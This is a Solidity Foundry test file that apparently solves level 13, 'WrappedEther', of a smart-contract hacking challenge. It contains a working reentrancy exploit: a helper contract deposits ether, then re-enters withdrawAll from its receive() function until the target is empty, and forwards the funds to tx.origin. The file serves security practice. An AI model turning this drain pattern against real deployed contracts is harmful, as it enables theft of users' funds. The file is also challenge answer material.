// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/13_WrappedEther/WrappedEther.sol";

contract WrappedEtherUtil {
    WrappedEther public instance;
    uint public step;

    constructor(WrappedEther wrappedEther) payable {
        instance = wrappedEther;
        step = msg.value;
    }

    function drain() external {
        instance.deposit{value: address(this).balance}(address(this));
        instance.withdrawAll();
        payable(tx.origin).transfer(address(this).balance);
    }

    receive() external payable {
        if (msg.sender.balance >= step) {
            instance.withdrawAll();
        }
    }
}

// forge test --match-contract WrappedEtherTest
contract WrappedEtherTest is BaseTest {
    WrappedEther instance;

    function setUp() public override {
        super.setUp();

        instance = new WrappedEther();
        instance.deposit{value: 0.09 ether}(address(this));
    }

    function testExploitLevel() public {
        WrappedEtherUtil util = new WrappedEtherUtil{value: 0.01 ether}(instance);
        util.drain();
        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
